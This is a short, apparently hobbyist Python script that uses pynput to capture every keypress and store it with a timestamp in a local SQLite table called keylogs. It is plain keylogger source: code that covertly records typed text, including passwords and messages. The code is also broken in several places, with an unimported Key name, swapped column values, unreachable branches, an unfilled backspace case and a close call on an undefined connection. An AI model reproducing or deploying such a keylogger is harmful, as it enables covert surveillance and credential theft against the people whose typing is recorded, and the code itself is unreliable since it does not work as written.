import sqlite3
from datetime import datetime
from pynput import keyboard

# Create a table to store keylogger data (if it doesn't already exist)

# Define the on_press function to be called when a key is pressed
def on_press(key):
    try:
        conn = sqlite3.connect("mydatabase.db")
        cursor = conn.cursor()
        cursor.execute('''CREATE TABLE IF NOT EXISTS keylogs
                  (id INTEGER ,
                   timestamp TEXT,
                   keypress TEXT)''')
#         cursor.execute("DROP TABLE keylogs")
        if hasattr(key, 'char'):
            if key.char.isalpha():
                if hasattr(key, 'shift') and key.shift:
                    cursor.execute("INSERT INTO keylogs VALUES(?,?,?)", [1,str(key.char).upper(), str(datetime.now())])
                else:
                    cursor.execute("INSERT INTO keylogs VALUES(?,?,?)", [1,key.char, str(datetime.now())])
            elif key == Key.space:
                cursor.execute("INSERT INTO keylogs VALUES(?,?,?)", [1," ", str(datetime.now())])
            elif key == Key.enter:
                cursor.execute("INSERT INTO keylogs VALUES(?,?,?)", [1,"\n", str(datetime.now())])
            elif key == Key.backspace:
                # delete the last character from the file
                pass # fill this part
        conn.commit()
        conn.close()
    except Exception as e:
        print(e)



# Create a listener for keyboard events
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

# Close the database connection
conn.close()
